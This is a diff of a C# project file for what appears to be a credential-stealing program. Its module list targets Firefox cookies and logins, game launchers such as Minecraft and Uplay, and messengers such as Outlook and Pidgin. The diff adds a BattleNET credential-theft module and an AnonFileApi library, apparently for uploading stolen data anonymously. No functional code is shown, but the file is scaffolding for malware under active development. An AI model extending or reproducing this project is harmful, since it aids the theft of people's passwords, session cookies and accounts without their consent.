@@ -56,6 +56,10 @@
     <ApplicationIcon>default.ico</ApplicationIcon>
   </PropertyGroup>
   <ItemGroup>
+    <Reference Include="AnonFileApi, Version=1.0.0.0, Culture=neutral, processorArchitecture=MSIL">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>..\packages\AnonFileApi.1.14.6\lib\net40\AnonFileApi.dll</HintPath>
+    </Reference>
     <Reference Include="DotNetZip, Version=1.13.8.0, Culture=neutral, PublicKeyToken=6583c7c814667745, processorArchitecture=MSIL">
       <HintPath>..\packages\DotNetZip.1.13.8\lib\net40\DotNetZip.dll</HintPath>
     </Reference>
@@ -127,6 +131,7 @@
     <Compile Include="Modules\Passwords\Targets\Browsers\Firefox\Cookies.cs" />
     <Compile Include="Modules\Passwords\Targets\Browsers\Firefox\Logins.cs" />
     <Compile Include="Modules\Passwords\Targets\Gaming\Minecraft.cs" />
+    <Compile Include="Modules\Passwords\Targets\Gaming\BattleNET.cs" />
     <Compile Include="Modules\Passwords\Targets\Gaming\Uplay.cs" />
     <Compile Include="Modules\Passwords\Targets\Messengers\Outlook.cs" />
     <Compile Include="Modules\Passwords\Targets\Messengers\Pidgin.cs" />
@@ -166,7 +171,6 @@
   </ItemGroup>
   <ItemGroup>
     <Content Include="default.ico" />
-    <Content Include="Foobar2000.ico" />
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
 </Project>
